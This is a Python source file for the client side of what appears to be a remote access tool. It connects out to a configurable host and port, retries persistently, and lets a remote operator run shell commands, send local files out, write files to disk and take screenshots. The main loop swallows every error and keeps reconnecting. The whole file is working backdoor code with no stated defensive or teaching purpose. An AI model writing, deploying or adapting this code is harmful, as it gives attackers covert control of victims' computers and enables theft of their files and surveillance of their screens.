#!/usr/bin/env python3
# standard python libraries
import time
import subprocess
import base64
import socket
import sys
# non-standard libraries
import mss


class Client:
    def __init__(self):
        self.connection = Connection()
        self.exit = False

        while not self.exit:
            received = self.connection.recv(self.connection.sock).decode(self.connection.CODEC)
            command = received[0]
            attribute = received[1:]

            if command == "c":
                self.execute_command(attribute.split()[0], attribute[len(attribute.split()[0]):])
            elif command == "d":
                self.download_file(attribute)
            elif command == "u":
                self.upload_file(attribute)
            elif command == "s":
                self.make_screenshot(attribute.split()[0], attribute.split()[1])
            elif command == "r":
                self.connection.sock.close()
                self.exit = True

    def execute_command(self, timeout, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            process.wait(timeout=int(timeout))
            data = process.stdout.read() + process.stderr.read()
        except UnicodeDecodeError:
            data = "[-] UnicodeDecodeError"
        except subprocess.TimeoutExpired:
            data = "[-] TimeoutExpired"
        self.connection.send(data.encode(self.connection.CODEC), self.connection.sock)

    def download_file(self, path):
        try:
            with open(path, "rb") as file:
                data = base64.b64encode(file.read()) + self.connection.END_MARKER
        except FileNotFoundError:
            header = "[-] FileNotFoundError"
            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
        except PermissionError:
            header = "[-] PermissionError"
            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
        else:
            header = str(len(data))
            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
            self.connection.sock.send(data)

    def upload_file(self, path):
        data = base64.b64decode(self.connection.recv(self.connection.sock))
        with open(path, "wb") as file:
            file.write(data)

    def make_screenshot(self, monitor, path):
        error = "no error"
        try:
            with mss.mss() as sct:
                sct.shot(mon=int(monitor), output=path)
        except mss.exception.ScreenShotError:
            error = "[-] MonitorDoesNotExist"
        except ValueError:
            error = "[-] InvalidMonitorIndex"
        except FileNotFoundError:
            error = "[-] FileNotFoundError"
        print(error)
        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)


class Connection:
    def __init__(self):
        self.CODEC = "utf-8"
        self.END_MARKER = "-".encode(self.CODEC)
        self.PACKET_SIZE = 1024

        HOST = "127.0.0.1"
        PORT = 10009

        if len(sys.argv) == 3:
            HOST = str(sys.argv[1])
            PORT = int(sys.argv[2])

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.sock.connect((HOST, PORT))
                break
            except socket.error:
                time.sleep(30)

    def send(self, data, connection):
        data = base64.b64encode(data) + self.END_MARKER
        connection.send(data)

    def recv(self, connection):
        data = bytes()
        while not data.endswith(self.END_MARKER):
            data += connection.recv(self.PACKET_SIZE)
        return base64.b64decode(data[:-1])


if __name__ == "__main__":
    while True:
        try:
            client = Client()
            if client.exit:
                break
        except:
            pass
